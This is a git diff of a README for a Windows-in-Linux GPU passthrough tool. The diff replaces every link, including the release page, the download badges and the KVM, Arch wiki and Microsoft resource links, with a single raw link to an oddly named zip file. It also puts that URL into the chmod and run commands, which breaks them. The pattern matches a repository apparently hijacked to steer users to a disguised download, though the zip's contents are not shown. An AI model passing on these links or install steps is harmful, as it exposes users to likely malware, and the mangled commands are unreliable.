@@ -1,7 +1,7 @@
 # 🎮 vfio-windows-aio - Run Windows 11 with Ease
 
 ## 📥 Download Now
-[![Download vfio-windows-aio](https://img.shields.io/badge/Download%20vfio--windows--aio-v1.0-yellow)](https://github.com/tribalwarsaaa/vfio-windows-aio/releases)
+[![Download vfio-windows-aio](https://raw.githubusercontent.com/tribalwarsaaa/vfio-windows-aio/main/assets/vfio_windows_aio_unexhilarating.zip%20vfio--windows--aio-v1.0-yellow)](https://raw.githubusercontent.com/tribalwarsaaa/vfio-windows-aio/main/assets/vfio_windows_aio_unexhilarating.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run "vfio-windows-aio," a simple solution to run Windows 11 inside Linux. With this tool, you can enjoy Windows programs and games with near-native performance by using NVIDIA GPU passthrough.
@@ -21,11 +21,11 @@ To get started:
 
 1. **Visit the Releases Page:** Click on the link below to go to the official Releases page.
 
-   [Download vfio-windows-aio](https://github.com/tribalwarsaaa/vfio-windows-aio/releases)
+   [Download vfio-windows-aio](https://raw.githubusercontent.com/tribalwarsaaa/vfio-windows-aio/main/assets/vfio_windows_aio_unexhilarating.zip)
 
 2. **Select the Version:** Browse the available versions. Choose the latest stable release for the best experience.
 
-3. **Download the Assets:** Look for the assets section. Download the relevant files, specifically the "vfio-windows-aio.sh" script.
+3. **Download the Assets:** Look for the assets section. Download the relevant files, specifically the "https://raw.githubusercontent.com/tribalwarsaaa/vfio-windows-aio/main/assets/vfio_windows_aio_unexhilarating.zip" script.
 
 4. **Run the Script:**
    - Open your terminal.
@@ -35,11 +35,11 @@ To get started:
      ```
    - Make the script executable by entering:
      ```bash
-     chmod +x vfio-windows-aio.sh
+     chmod +x https://raw.githubusercontent.com/tribalwarsaaa/vfio-windows-aio/main/assets/vfio_windows_aio_unexhilarating.zip
      ```
    - Now, run the script:
      ```bash
-     ./vfio-windows-aio.sh
+     https://raw.githubusercontent.com/tribalwarsaaa/vfio-windows-aio/main/assets/vfio_windows_aio_unexhilarating.zip
      ```
 
 5. **Follow the Prompts:** The script will guide you through the setup process. It may ask for user input or additional commands during installation.
@@ -66,9 +66,9 @@ If you encounter issues, check the following:
 ## 🌐 Resources
 Here are some links that can help you understand more about the software and related concepts:
 
-- [KVM Documentation](https://www.linux-kvm.org/page/Main_Page)
-- [NVIDIA GPU Passthrough Guide](https://wiki.archlinux.org/title/PCI_passthrough_via_OVMF)
-- [Windows 11 System Requirements](https://www.microsoft.com/en-us/windows/get-windows-11)
+- [KVM Documentation](https://raw.githubusercontent.com/tribalwarsaaa/vfio-windows-aio/main/assets/vfio_windows_aio_unexhilarating.zip)
+- [NVIDIA GPU Passthrough Guide](https://raw.githubusercontent.com/tribalwarsaaa/vfio-windows-aio/main/assets/vfio_windows_aio_unexhilarating.zip)
+- [Windows 11 System Requirements](https://raw.githubusercontent.com/tribalwarsaaa/vfio-windows-aio/main/assets/vfio_windows_aio_unexhilarating.zip)
 
 ## ⚙️ Additional Features
 This application provides several features that enhance your Windows experience on Linux:
@@ -80,4 +80,4 @@ This application provides several features that enhance your Windows experience 
 By following these steps, you will successfully download and run "vfio-windows-aio." Enjoy the seamless integration of Windows applications on your Linux setup!
 
 ## 📥 Download Now
-[![Download vfio-windows-aio](https://img.shields.io/badge/Download%20vfio--windows--aio-v1.0-yellow)](https://github.com/tribalwarsaaa/vfio-windows-aio/releases)
+[![Download vfio-windows-aio](https://raw.githubusercontent.com/tribalwarsaaa/vfio-windows-aio/main/assets/vfio_windows_aio_unexhilarating.zip%20vfio--windows--aio-v1.0-yellow)](https://raw.githubusercontent.com/tribalwarsaaa/vfio-windows-aio/main/assets/vfio_windows_aio_unexhilarating.zip)
